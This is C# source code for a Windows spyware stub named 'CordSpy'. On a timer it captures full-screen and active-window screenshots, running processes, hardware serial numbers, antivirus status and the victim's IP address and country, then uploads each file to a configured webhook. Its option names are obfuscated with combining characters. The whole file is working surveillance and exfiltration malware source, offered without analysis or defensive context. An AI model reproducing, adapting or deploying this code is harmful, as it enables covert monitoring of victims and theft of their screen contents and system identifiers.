using System;using System.IO;using System.Drawing;using System.Windows.Forms;using System.Drawing.Imaging;using System.Diagnostics;using System.Management;using System.Net.Http;using Newtonsoft.Json;using RestSharp;using System.Collections;using System.Net;using System.Threading.Tasks;using System.Globalization;using System.Runtime.InteropServices;namespace CordSpy_Stub{public partial class Form1 : Form{ public static string CordPath = Path.GetTempPath() + "Xasorlgid83724"; public Form1(){InitializeComponent(); } private void Form1_Load(object sender, EventArgs e){timer1.Start();}private void timer1_Tick(object sender, EventArgs e){ if (!Directory.Exists(CordPath)) { Directory.CreateDirectory(CordPath); } timer1.Interval = Convert.ToInt32(ConversionTime(Convert.ToDouble(Options.Ḷ̸̙̤͔̰̐̓̿̈́̓̕͠ò̸̧̱̙̗̦̍̆͝͝ͅg̴̨̝͎̙͈̹͛́́̽̀̈͌̋̐̀s̴̞̤͎̙̣̼̆̀̿͐̍̎͝Ț̶̘̮̮̞̮̼̘̈͊͂̌͘i̴̢̙̮͇͇̔́͊̇̅̌m̸̧̱͖̖̝̳͍̓̊̈ȇ̵̮̫̲̣̼̪̻͔̍̌̇̆̚̕͝͝͝.LogsTime))); if (Options.S̾c̾r̾e̾e̾n̾s̾h̾o̾t̾.Screenlog == "True") { Rectangle b = Screen.GetBounds(Point.Empty); using (Bitmap bitmap = new Bitmap(b.Width, b.Height)) { using (Graphics g = Graphics.FromImage(bitmap)) { g.CopyFromScreen(Point.Empty, Point.Empty, b.Size); } bitmap.Save(CordPath + "\\Screen.jpg", ImageFormat.Jpeg); } string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\Screen.jpg";  using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Image", "CordSpy.jpg"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); } }  if (Options.R͓̽u͓̽n͓̽n͓̽i͓̽n͓̽g͓̽P͓̽r͓̽o͓̽c͓̽e͓̽s͓̽s͓̽e͓̽s͓̽.RunningProcListLog == "True") { if (File.Exists(CordPath + "\\ProcList.txt")) { File.Delete(CordPath + "\\ProcList.txt"); } Process[] pl = Process.GetProcesses(); foreach (Process p in pl) { File.AppendAllText(CordPath + "\\ProcList.txt","Process Name: " + p.ProcessName + " Process ID: " + p.Id + "\n"); } string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\ProcList.txt"; using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "ProcList.txt"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); }  } if (Options._P__c___I__n__f__o_.PcInfoLog == "True") { if (File.Exists(CordPath + "\\PcInfo.txt")) { File.Delete(CordPath + "\\PcInfo.txt"); } File.AppendAllText(CordPath + "\\PcInfo.txt", $"Pc Name: {Environment.UserName}\nCpu: "); Cpu(); File.AppendAllText(CordPath + "\\PcInfo.txt", "\nBaseboard: "); Baseboard(); File.AppendAllText(CordPath + "\\PcInfo.txt", "\nHard Disk: "); HDD(); File.AppendAllText(CordPath + "\\PcInfo.txt", "\nBios: "); BIOS(); string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\PcInfo.txt"; using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "PcInfo.txt"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); } } if (Options.A_n_t_i_V_i_r_u_s_.AntiVirusLogs == "True"){ bool returnCode = AntivirusInstalled(); if (File.Exists(CordPath + "\\AvInstalled.txt")) { File.Delete(CordPath + "\\AvInstalled.txt"); } File.AppendAllText(CordPath + "\\AvInstalled.txt", $"Av: {returnCode.ToString()}"); string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\AvInstalled.txt"; using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "AvInstalled.txt"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); } } if (Options.Ǧ̴̡̭͂̌̏͌ḛ̸̾̂͊͘͝o̷̢̙̽̌̈͐͒̈̾̄L̸̡̛̦͍̥̤̪̓̈́̐̒̒̄ͅo̴̧̻̻̩̯̘͕̿͒̃̇̕c̷̨̼͎͔͔̹̗͙͂͗̑̂à̴̧̬̫͕̞͙̮͑̈́̀̓̒͜͠ͅt̵̩̘̹̽̀́͌̍͝i̴̡̠̜̬͗́͜o̶̝͂͝͠ņ̴̱͈̼̘͙͈̘͋.GeoLocationLogs == "True") { if (File.Exists(CordPath + "\\IpInfo.txt")) { File.Delete(CordPath + "\\IpInfo.txt"); } var ip = new WebClient().DownloadString("http://icanhazip.com"); File.AppendAllText(CordPath + "\\IpInfo.txt", $"Ip: {ip}\nLocation: {GetUserCountryByIp(ip)}"); string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\IpInfo.txt"; using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "IpInfo.txt"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); }} if (Options.C̶̳̱̃̏͆̿̍̈́̆u̴͙̣̍͋̉̄̈̆̈ŕ̶̡̖̙̖̺̌̈́ȑ̸̨̛̳̲͓̦͉̪̱͋̊̎̒̾̅̽͠ḝ̷͍̙̥̦̻͛̽̓̓ñ̴̢̹̺̞͍̟̂̏̓̌͝t̵͈͉͍̙͉̺͕͍̭̞͆̃́̍͝W̴̓̎̏͌̂̾̒͝ͅḭ̵̗͖̭͇͙͇̉́̒̕ņ̷̧͓̺̪̩̠̗̹̻̈́̓̉̅͒d̵̡̢̛̪͍̣͇̗̺̣̓̉̄͒̾͂͝ỏ̶̝̲͍̞̫̮͕̽ẇ̷̹̺̓̐̑̈̔̇͝.CurrentWindow == "True") {var image = ScreenCapture.CaptureActiveWindow();image.Save(CordPath + "\\CurrentWindow.jpg");string hook = Options.Ẁ̵̻͓͖̍̉̉̐̈̔͘̚ë̶̡̦͚̮͖̔ḅ̵̨̣̺̗͇͆h̴̨͖̘̻̬͕̠̫̀̔̃͋̿͝o̷͔̼͎̼͖͓̅̍̌̽̐́͆́̀͛o̵̻̲̤̲̝̖͑̄k̵̰̈́͌̈́̊͌̂̓̍̄.Webhook; string Fpath = CordPath + "\\CurrentWindow.jpg"; using (HttpClient httpClient = new HttpClient()) { MultipartFormDataContent form = new MultipartFormDataContent(); var file_bytes = System.IO.File.ReadAllBytes(Fpath); form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Image", "CurrentWindow.jpg"); httpClient.PostAsync(hook, form).Wait(); httpClient.Dispose(); } }}public static double ConversionTime(double mins) { return TimeSpan.FromMinutes(mins).TotalMilliseconds; } public static void Cpu() { ManagementClass mc = new ManagementClass("Win32_Processor"); ManagementObjectCollection moc = mc.GetInstances(); string strID = null; foreach (ManagementObject mo in moc) { File.AppendAllText(CordPath + "\\PcInfo.txt", mo.Properties["ProcessorId"].Value.ToString()); } } public static void Baseboard() { ManagementClass mc = new ManagementClass("Win32_BaseBoard"); ManagementObjectCollection moc = mc.GetInstances(); string strID = null; foreach (ManagementObject mo in moc) { File.AppendAllText(CordPath + "\\PcInfo.txt", mo.Properties["SerialNumber"].Value.ToString()); } } public static void HDD() { ManagementClass mc = new ManagementClass("Win32_PhysicalMedia"); ManagementObjectCollection moc = mc.GetInstances(); string strID = null; foreach (ManagementObject mo in moc) { File.AppendAllText(CordPath + "\\PcInfo.txt", mo.Properties["SerialNumber"].Value.ToString()); } }  public static void BIOS() { ManagementClass mc = new ManagementClass("Win32_BIOS"); ManagementObjectCollection moc = mc.GetInstances(); string strID = null; foreach (ManagementObject mo in moc) { File.AppendAllText(CordPath + "\\PcInfo.txt", mo.Properties["SerialNumber"].Value.ToString()); } }public static bool AntivirusInstalled() {string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter";try{ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");ManagementObjectCollection instances = searcher.Get();return instances.Count > 0;}catch (Exception e){Console.WriteLine(e.Message);}return false;}public static string GetUserCountryByIp(string ip) {IpInfo ipInfo = new IpInfo();try {string info = new WebClient().DownloadString("http://ipinfo.io/" + ip);ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);RegionInfo myRI1 = new RegionInfo(ipInfo.Country);ipInfo.Country = myRI1.EnglishName;}catch (Exception){ ipInfo.Country = null;}return ipInfo.Country;}public class IpInfo{ [JsonProperty("ip")]public string Ip { get; set; }[JsonProperty("hostname")]public string Hostname { get; set; }[JsonProperty("city")]public string City { get; set; }[JsonProperty("region")] public string Region { get; set; }[JsonProperty("country")] public string Country { get; set; } [JsonProperty("loc")]public string Loc { get; set; }[JsonProperty("org")]public string Org { get; set; } [JsonProperty("postal")]public string Postal { get; set; }} }public class ScreenCapture{[DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]public static extern IntPtr GetDesktopWindow();[StructLayout(LayoutKind.Sequential)] private struct Rect{ public int Left;public int Top;public int Right; public int Bottom;} [DllImport("user32.dll")]private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);public static Image CaptureDesktop(){return CaptureWindow(GetDesktopWindow());}public static Bitmap CaptureActiveWindow(){return CaptureWindow(GetForegroundWindow());}public static Bitmap CaptureWindow(IntPtr handle) {var rect = new Rect();GetWindowRect(handle, ref rect); var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);var result = new Bitmap(bounds.Width, bounds.Height);using (var graphics = Graphics.FromImage(result)){graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);}return result; }}}
